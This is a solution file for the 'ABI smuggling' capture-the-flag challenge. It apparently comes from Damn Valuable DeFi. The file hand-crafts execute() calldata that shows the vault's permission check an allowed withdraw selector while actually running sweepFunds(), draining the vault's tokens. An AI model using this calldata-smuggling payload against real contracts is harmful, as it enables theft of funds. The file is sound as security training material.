const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;
    
    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, player, recovery ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        console.log(`token.balance[player]: ${await token.balanceOf(player.address)}`);
        let ABI = [
            "function execute(address target, bytes calldata actionData)",
            "function sweepFunds(address receiver, address token)",
            "function withdraw(address token, address recipient, uint256 amount)"
        ];
        let iface = new ethers.utils.Interface(ABI);
        let sweepFundsData = iface.encodeFunctionData("sweepFunds",[player.address, token.address]);
        let withdrawData = iface.encodeFunctionData("withdraw", [token.address, player.address, 10000n]);
        let excuteWithdrawData = iface.encodeFunctionData("execute", [vault.address, withdrawData]);
        let excuteSweepFundsData = iface.encodeFunctionData("execute", [vault.address, sweepFundsData]);
        console.log(`sweepFunds(): ${sweepFundsData}`);
        console.log(`withdraw()  : ${withdrawData}`);
        console.log(`excute(sweepFunds()): ${excuteSweepFundsData}`);
        console.log(`excute(withdraw())  : ${excuteWithdrawData}`);
        
        let payload = "0x1cff79cd";                                                             // 1-4    : execute() function's signature
        payload = payload + "000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512"; // 5-36   : target address
        payload = payload + "00000000000000000000000000000000000000000000000000000000000000E0"; // 37-68  : actionData offset from end of signature to start position of actionData; 0xE0 = 224
        payload = payload + "0000000000000000000000000000000000000000000000000000000000000000"; // 69-100 : zero papdding
        payload = payload + "d9caed12";                                                         // 101-104: withdraw() function's signature + zero padding
        payload = payload + "0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3"; // 105-136: token address
        payload = payload + "00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8"; // 137-168: recipient address
        payload = payload + "0000000000000000000000000000000000000000000000000000000000002710"; // 169-200: amount
        payload = payload + "00000000000000000000000000000000000000000000000000000000";         // 201-228: padding
        payload = payload + "0000000000000000000000000000000000000000000000000000000000000044"; // 229-260: size of actionData
        payload = payload + "85fb709d";                                                         // 261-264: sweepFunds() function's signature
        payload = payload + "00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8"; // 265-286: receiver address
        payload = payload + "0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3"; // 287-318: token address
        payload = payload + "00000000000000000000000000000000000000000000000000000000";         // 319-348: padding

        console.log(`payload: ${payload}`);
        tx = {
            to: vault.address,
            data: payload,
            gasLimit: 2000000
        };
        await player.sendTransaction(tx);
        let amount = await token.balanceOf(player.address);
        console.log(`token.balance[player]  : ${amount}`);
        console.log(`transfering from player wallet to recovery contract....`);
        await token.connect(player).transfer(recovery.address, amount);
        console.log(`token.balance[recovery]: ${await token.balanceOf(recovery.address)}`);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});


/**
sweepFunds(): 0x85fb709d00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c80000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3
withdraw()  : 0xd9caed120000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c80000000000000000000000000000000000000000000000000000000000002710
excute(sweepFunds()): 0x1cff79cd000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f05120000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000004485fb709d00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c80000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000
excute(withdraw())  : 0x1cff79cd000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f051200000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000064d9caed120000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8000000000000000000000000000000000000000000000000000000000000271000000000000000000000000000000000000000000000000000000000
selector.sweepFunds : 0x85fb709d
selector.withdraw   : 0xd9caed12


execute(sweepFunds())
0x
1cff79cd
000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
0000000000000000000000000000000000000000000000000000000000000040                    40 = 64
0000000000000000000000000000000000000000000000000000000000000044                    44 = 68
    85fb709d
    00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8
    0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3
    00000000000000000000000000000000000000000000000000000000

execute(withdraw())
0x
1cff79cd
000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
0000000000000000000000000000000000000000000000000000000000000040                    40 = 64
0000000000000000000000000000000000000000000000000000000000000064                    64 = 100
    d9caed12
    0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3
    00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8
    0000000000000000000000000000000000000000000000000000000000002710
    00000000000000000000000000000000000000000000000000000000

*/